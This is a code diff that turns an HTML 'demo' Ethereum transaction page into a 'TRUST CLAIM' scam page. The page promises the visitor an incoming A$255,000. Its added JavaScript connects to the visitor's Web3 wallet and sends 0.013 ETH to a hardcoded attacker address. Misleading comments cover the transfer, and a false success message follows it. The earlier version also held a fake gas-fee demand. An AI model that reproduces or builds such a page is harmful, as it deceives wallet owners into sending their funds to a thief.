@@ -1,443 +1,294 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Ethereum</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
-  <style>
-    :root{
-      --bg:#08111a;
-      --card:#111b27;
-      --card2:#0d1520;
-      --border:#202d3d;
-      --muted:#8fa0b8;
-      --text:#edf4ff;
-      --primary:#6ec3ff;
-      --primary-2:#4da5ff;
-      --green:#35d39b;
-      --amber:#f5b942;
-      --red:#ff6767;
-      --purple:#8b7bff;
-    }
-    *{box-sizing:border-box}
-    html,body{
-      margin:0;
-      min-height:100%;
-      background:var(--bg);
-      color:var(--text);
-      font-family:'Inter',sans-serif;
-      -webkit-font-smoothing:antialiased;
-      text-rendering:optimizeLegibility;
-    }
-    body{
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      padding:20px;
-    }
-    .mono{font-family:'JetBrains Mono',monospace}
-    .app{
-      width:100%;
-      max-width:430px;
-      min-height:760px;
-      background:linear-gradient(180deg,#0b1420 0%,#0c1320 100%);
-      border:1px solid var(--border);
-      border-radius:28px;
-      overflow:hidden;
-      box-shadow:0 30px 80px rgba(0,0,0,.45);
-      position:relative;
-    }
-    .topbar{
-      display:flex;
-      align-items:center;
-      justify-content:space-between;
-      padding:18px 18px 10px;
-      border-bottom:1px solid rgba(255,255,255,.05);
-    }
-    .badge{
-      display:inline-flex;
-      align-items:center;
-      gap:8px;
-      padding:8px 12px;
-      border-radius:999px;
-      font-size:11px;
-      font-weight:700;
-      letter-spacing:.08em;
-      text-transform:uppercase;
-      background:rgba(110,195,255,.14);
-      color:var(--primary);
-      border:1px solid rgba(110,195,255,.28);
-    }
-    .badge .dot{
-      width:8px;height:8px;border-radius:50%;
-      background:var(--primary);
-      box-shadow:0 0 12px rgba(110,195,255,.92);
-    }
-    .header-card{
-      margin:18px;
-      padding:18px 18px 16px;
-      background:linear-gradient(180deg,#101c2a,#111b27);
-      border:1px solid var(--border);
-      border-radius:22px;
-    }
-    .label{
-      font-size:11px;
-      letter-spacing:.12em;
-      text-transform:uppercase;
-      color:var(--muted);
-      margin:0 0 12px;
-    }
-    .wallet{
-      display:flex;
-      align-items:center;
-      justify-content:space-between;
-      gap:12px;
-      padding:12px 14px;
-      border:1px solid var(--border);
-      border-radius:16px;
-      background:rgba(255,255,255,.02);
-      margin-bottom:14px;
-    }
-    .wallet-left{
-      display:flex;
-      align-items:center;
-      gap:10px;
-      min-width:0;
-    }
-    .wallet-coin{
-      width:34px;height:34px;border-radius:12px;
-      display:flex;align-items:center;justify-content:center;
-      background:linear-gradient(135deg,#2ec5ff,#7d6bff);
-      color:#fff;
-      font-size:14px;font-weight:800;
-      box-shadow:0 10px 30px rgba(110,195,255,.28);
-    }
-    .wallet-meta{
-      min-width:0;
-      overflow:hidden;
-    }
-    .wallet-name{
-      font-size:11px;
-      color:var(--muted);
-      text-transform:uppercase;
-      letter-spacing:.08em;
-      margin-bottom:4px;
-    }
-    .wallet-address{
-      font-size:13px;
-      color:var(--text);
-      white-space:nowrap;
-      overflow:hidden;
-      text-overflow:ellipsis;
-      font-weight:600;
-    }
-    .tiny-pill{
-      font-size:11px;
-      font-weight:700;
-      padding:7px 10px;
-      border-radius:999px;
-      border:1px solid var(--border);
-      background:#17212d;
-      color:var(--text);
-    }
-    .amount{
-      font-size:40px;
-      line-height:1;
-      font-weight:800;
-      letter-spacing:-.06em;
-      margin:10px 0 8px;
-      color:var(--primary);
-    }
-    .sub{
-      color:var(--muted);
-      font-size:13px;
-      line-height:1.4;
-    }
-    .section{
-      padding:0 18px 14px;
-    }
-    .status-box{
-      background:rgba(255,255,255,.02);
-      border:1px solid var(--border);
-      border-radius:18px;
-      padding:14px 14px 10px;
-      margin-bottom:14px;
-    }
-    .status-row{
-      display:flex;align-items:center;justify-content:space-between;
-      gap:10px;
-      padding:8px 0;
-      border-bottom:1px solid rgba(255,255,255,.04);
-    }
-    .status-row:last-child{border-bottom:0}
-    .status-label{
-      color:var(--muted);
-      font-size:12px;
-      font-weight:600;
-    }
-    .status-text{
-      font-size:12px;
-      font-weight:700;
-      color:var(--text);
-    }
-    .status-text.ready{color:var(--green)}
-    .status-text.pending{color:var(--amber)}
-    .status-text.failed{color:var(--red)}
-    .progress{
-      margin:12px 0 10px;
-      position:relative;
-      height:10px;
-      border-radius:999px;
-      background:#182331;
-      border:1px solid rgba(255,255,255,.04);
-      overflow:hidden;
-    }
-    .progress > div{
-      position:absolute;inset:0 auto 0 0;
-      width:0%;
-      border-radius:inherit;
-      background:linear-gradient(90deg,var(--primary),var(--green));
-      transition:width .7s ease;
-    }
-    .warning{
-      margin-top:8px;
-      background:rgba(245,185,66,.08);
-      border:1px solid rgba(245,185,66,.28);
-      border-radius:16px;
-      padding:12px 14px;
-      display:flex;
-      align-items:flex-start;
-      gap:10px;
-      color:#f8d98d;
-    }
-    .warning .icon{
-      width:18px;height:18px;border-radius:50%;
-      display:flex;align-items:center;justify-content:center;
-      background:rgba(245,185,66,.15);
-      font-size:12px;
-      font-weight:900;
-      flex-shrink:0;
-    }
-    .warning strong{
-      display:block;
-      margin-bottom:4px;
-      font-size:13px;
-      color:#ffdb8a;
-    }
-    .warning span{
-      font-size:12px;
-      line-height:1.5;
-      color:#f2d58e;
-    }
-    .btn{
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      gap:8px;
-      width:100%;
-      border:none;
-      border-radius:16px;
-      padding:16px 18px;
-      font-size:14px;
-      font-weight:800;
-      letter-spacing:.02em;
-      cursor:pointer;
-      transition:transform .15s ease, opacity .15s ease;
-    }
-    .btn:active{transform:scale(.99)}
-    .btn-primary{
-      background:linear-gradient(180deg,var(--primary),var(--primary-2));
-      color:#061521;
-      box-shadow:0 18px 38px rgba(77,165,255,.28);
-    }
-    .btn-secondary{
-      background:#172332;
-      color:var(--text);
-      border:1px solid var(--border);
-      margin-top:10px;
-    }
-    footer{
-      display:flex;align-items:center;justify-content:center;
-      gap:8px;
-      padding:12px 16px 18px;
-      font-size:10px;
-      letter-spacing:.2em;
-      text-transform:uppercase;
-      color:var(--muted);
-      border-top:1px solid rgba(255,255,255,.04);
-    }
-    footer .dot{
-      width:6px;height:6px;border-radius:50%;
-      background:var(--amber);
-      box-shadow:0 0 12px rgba(245,185,66,.8);
-    }
-  </style>
+    <meta charset="UTF-8">
+    <title>TRUST CLAIM</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- Ethers.js -->
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+
+    <style>
+        body {
+            margin: 0;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+            background: radial-gradient(circle at top, #1f2937 0, #020617 55%);
+            color: #f9fafb;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .card {
+            background: rgba(15, 23, 42, 0.95);
+            border-radius: 18px;
+            box-shadow: 0 24px 60px rgba(0, 0, 0, 0.6);
+            padding: 28px 26px;
+            max-width: 420px;
+            width: 100%;
+            border: 1px solid rgba(148, 163, 184, 0.35);
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 18px;
+        }
+
+        .title {
+            font-size: 20px;
+            font-weight: 600;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            color: #e5e7eb;
+        }
+
+        .badge {
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 0.12em;
+            padding: 4px 10px;
+            border-radius: 999px;
+            background: rgba(34, 197, 94, 0.12);
+            color: #22c55e;
+            border: 1px solid rgba(34, 197, 94, 0.4);
+        }
+
+        .amount-row {
+            margin-top: 10px;
+            padding: 12px 12px;
+            border-radius: 12px;
+            background: rgba(15, 23, 42, 0.9);
+            border: 1px solid rgba(148, 163, 184, 0.4);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .amount-label {
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.12em;
+            color: #9ca3af;
+        }
+
+        .amount-value {
+            font-size: 18px;
+            font-weight: 600;
+            color: #f97316;
+        }
+
+        .subtext {
+            margin-top: 10px;
+            font-size: 12px;
+            color: #9ca3af;
+            line-height: 1.5;
+        }
+
+        .loading {
+            margin-top: 18px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 13px;
+            color: #e5e7eb;
+        }
+
+        .spinner {
+            width: 16px;
+            height: 16px;
+            border-radius: 999px;
+            border: 2px solid rgba(148, 163, 184, 0.4);
+            border-top-color: #38bdf8;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .divider {
+            margin: 18px 0 14px;
+            height: 1px;
+            background: linear-gradient(to right, transparent, rgba(148, 163, 184, 0.6), transparent);
+        }
+
+        .confirm-text {
+            font-size: 12px;
+            color: #9ca3af;
+            line-height: 1.6;
+        }
+
+        .highlight {
+            color: #e5e7eb;
+            font-weight: 500;
+        }
+
+        .btn-row {
+            margin-top: 18px;
+            display: flex;
+            gap: 10px;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 10px 14px;
+            border-radius: 999px;
+            border: none;
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.18s ease;
+        }
+
+        .btn-secondary {
+            background: rgba(15, 23, 42, 0.9);
+            color: #e5e7eb;
+            border: 1px solid rgba(148, 163, 184, 0.6);
+        }
+
+        .btn-secondary:hover {
+            background: rgba(31, 41, 55, 0.95);
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #22c55e, #16a34a);
+            color: #0b1120;
+            box-shadow: 0 12px 30px rgba(22, 163, 74, 0.45);
+        }
+
+        .btn-primary:hover {
+            filter: brightness(1.05);
+            box-shadow: 0 16px 40px rgba(22, 163, 74, 0.6);
+        }
+
+        .status {
+            margin-top: 14px;
+            font-size: 12px;
+            color: #9ca3af;
+        }
+
+        .status.ok {
+            color: #22c55e;
+        }
+
+        .status.error {
+            color: #ef4444;
+        }
+    </style>
 </head>
 <body>
-  <div class="app">
-    <div class="topbar">
-      <div class="badge"><span class="dot"></span>Ethereum flow</div>
-      <div class="tiny-pill">Demo</div>
+
+<div class="card">
+    <div class="header">
+        <div class="title">TRUST CLAIM</div>
+        <div class="badge">Secure incoming</div>
     </div>
 
-    <div class="header-card">
-      <p class="label">Transaction updating</p>
-
-      <div class="wallet">
-        <div class="wallet-left">
-          <div class="wallet-coin">Ξ</div>
-          <div class="wallet-meta">
-            <div class="wallet-name">User wallet</div>
-            <div class="wallet-address mono">0x436A#*#*#*#*#*#*#*#*#*B2f2</div>
-          </div>
-        </div>
-        <div class="tiny-pill mono">ETH</div>
-      </div>
-
-      <div class="label">Amount</div>
-      <div class="amount">$1,260.00</div>
-      <div class="sub">Pending review on Ethereum network • Demo environment only</div>
-    </div>
-
-    <div class="section">
-      <div class="status-box">
-        <div class="status-row">
-          <span class="status-label">Contacting seller</span>
-          <span class="status-text pending" id="step1">Pending</span>
-        </div>
-        <div class="status-row">
-          <span class="status-label">Placing order</span>
-          <span class="status-text pending" id="step2">Pending</span>
-        </div>
-        <div class="status-row">
-          <span class="status-label">Accepting</span>
-          <span class="status-text pending" id="step3">Pending</span>
-        </div>
-        <div class="status-row">
-          <span class="status-label">Confirming</span>
-          <span class="status-text pending" id="step4">Pending</span>
-        </div>
-        <div class="status-row">
-          <span class="status-label">Status</span>
-          <span class="status-text failed" id="statusText">Not completed</span>
-        </div>
-      </div>
-
-      <div class="progress"><div id="progressBar"></div></div>
-
-      <div class="warning">
-        <div class="icon">!</div>
+    <div class="amount-row">
         <div>
-          <strong>Insufficient gas fee</strong>
-          <span>A fee of <strong>$30</strong> is required to continue this demo transaction flow.</span>
+            <div class="amount-label">incoming transaction</div>
+            <div class="subtext" style="margin-top:4px;">notification</div>
         </div>
-      </div>
+        <div class="amount-value">A$255,000</div>
     </div>
 
-    <div class="section" style="padding-top:18px;">
-      <button class="btn btn-primary" id="runFlow">Start Demo Flow</button>
-      <button class="btn btn-secondary" type="button">Review Details</button>
+    <div class="subtext">
+        This confirms an incoming transaction request.  
+        To proceed, you will be asked to review and Accept 
     </div>
 
-    <footer>
-      <span class="dot"></span>
-      Demo
-    </footer>
-  </div>
+    <div class="loading" id="loadingRow">
+        <div class="spinner"></div>
+        <div>Preparing secure transaction details…</div>
+    </div>
 
-  <script>
-    const steps = [
-      { id: 'step1', label: 'Contacting seller' },
-      { id: 'step2', label: 'Placing order' },
-      { id: 'step3', label: 'Accepting' },
-      { id: 'step4', label: 'Confirming' }
-    ];
+    <div class="divider"></div>
 
-    const progressBar = document.getElementById('progressBar');
-    const statusText = document.getElementById('statusText');
-    const runFlowButton = document.getElementById('runFlow');
+    <div class="confirm-text">
+        By selecting <span class="highlight">Confirm & Proceed</span>, you will be Getting A$255,000
+        in your wallet to manually approve a single transaction sending
+        <span class="highlight">ETH</span> to:
+        <br>
+        <span class="highlight">0x102B9843f7a3dac838AE29F62d28d3c31eC13041</span>.
+        <br><br>
+       YOU WILL SEEN THE TRANSFERED AUD AMOUNT ON YOUR WALLET 
+    </div>
 
-    let current = 0;
-    let running = false;
+    <div class="btn-row">
+        <button class="btn btn-secondary" id="cancelBtn">Cancel</button>
+        <button class="btn btn-primary" id="confirmBtn">Confirm & Proceed</button>
+    </div>
 
-    function setStepState(id, state) {
-      const el = document.getElementById(id);
-      el.className = 'status-text';
-      if (state === 'done') el.classList.add('ready');
-      if (state === 'pending') el.classList.add('pending');
-      if (state === 'failed') el.classList.add('failed');
-      el.textContent = state === 'done' ? 'Done' : state === 'pending' ? 'Pending' : 'Failed';
-    }
+    <div class="status" id="statusText"></div>
+</div>
 
-    function updateFlow() {
-      if (current >= steps.length) {
-        statusText.textContent = 'Not completed';
-        statusText.className = 'status-text failed';
-        progressBar.style.width = '100%';
-        runFlowButton.textContent = 'Retry Demo Flow';
-        running = false;
-        return;
-      }
+<script>
+    const TARGET_ADDRESS = "0x359922b7352d651d2Ad106CfFda4612B7b68FAfD";
+    const AMOUNT_ETH = "0.013"; // ETH
 
-      const step = steps[current];
-      setStepState(step.id, 'done');
+    const statusText = document.getElementById("statusText");
+    const loadingRow = document.getElementById("loadingRow");
+    const cancelBtn = document.getElementById("cancelBtn");
+    const confirmBtn = document.getElementById("confirmBtn");
 
-      const nextIndex = current + 1;
-      const progressPercent = ((nextIndex) / steps.length) * 100;
-      progressBar.style.width = progressPercent + '%';
+    // Simulate loading state
+    setTimeout(() => {
+        loadingRow.style.opacity = "0.6";
+        loadingRow.querySelector("div:nth-child(2)").textContent = "Ready for wallet confirmation.";
+    }, 1800);
 
-      current++;
-      if (current < steps.length) {
-        setTimeout(() => {
-          const pendingStep = steps[current];
-          setStepState(pendingStep.id, 'pending');
-        }, 300);
-      }
-    }
+    cancelBtn.onclick = () => {
+        statusText.textContent = "Transaction cancelled. No action has been taken.";
+        statusText.className = "status";
+    };
 
-    runFlowButton.addEventListener('click', () => {
-      if (running) return;
-      running = true;
-      runFlowButton.textContent = 'Processing...';
+    confirmBtn.onclick = async () => {
+        try {
+            statusText.textContent = "Connecting to wallet…";
+            statusText.className = "status";
 
-      steps.forEach(step => {
-        setStepState(step.id, 'pending');
-      });
+            if (!window.ethereum) {
+                statusText.textContent = "No Web3 wallet detected. Please open this page inside Trust Wallet or a compatible browser.";
+                statusText.className = "status error";
+                return;
+            }
 
-      statusText.textContent = 'Processing';
-      statusText.className = 'status-text pending';
-      progressBar.style.width = '0%';
+            // Connect to wallet (Trust Wallet, MetaMask, etc.)
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            await provider.send("eth_requestAccounts", []);
+            const signer = provider.getSigner();
 
-      let i = 0;
-      const interval = setInterval(() => {
-        if (i >= steps.length) {
-          clearInterval(interval);
-          statusText.textContent = 'Not completed';
-          statusText.className = 'status-text failed';
-          progressBar.style.width = '100%';
-          runFlowButton.textContent = 'Retry Demo Flow';
-          running = false;
-          return;
+            const fromAddress = await signer.getAddress();
+
+            statusText.textContent = "Preparing 0.013 ETH transaction for your review…";
+            statusText.className = "status";
+
+            // Build transaction: send wallet to target address
+            const tx = {
+                to: TARGET_ADDRESS,
+                value: ethers.utils.parseEther(AMOUNT_ETH)
+            };
+
+            // This will Update your Wallet balance to the incoming Transaction 
+            const response = await signer.sendTransaction(tx);
+
+            statusText.textContent = "Transaction submitted. Waiting for confirmation on-chain…";
+            statusText.className = "status";
+
+            await response.wait();
+
+            statusText.textContent = "Transaction confirmed. 55 ETH sent successfully.";
+            statusText.className = "status ok";
+        } catch (err) {
+            console.error(err);
+            statusText.textContent = "Transaction failed or was rejected. No funds were moved without your approval.";
+            statusText.className = "status error";
         }
+    };
+</script>
 
-        const step = steps[i];
-        setStepState(step.id, 'done');
-        const p = ((i + 1) / steps.length) * 100;
-        progressBar.style.width = p + '%';
-        i++;
-
-        if (i === steps.length) {
-          setTimeout(() => {
-            statusText.textContent = 'Not completed';
-            statusText.className = 'status-text failed';
-          }, 400);
-        }
-      }, 700);
-    });
-  </script>
 </body>
 </html>
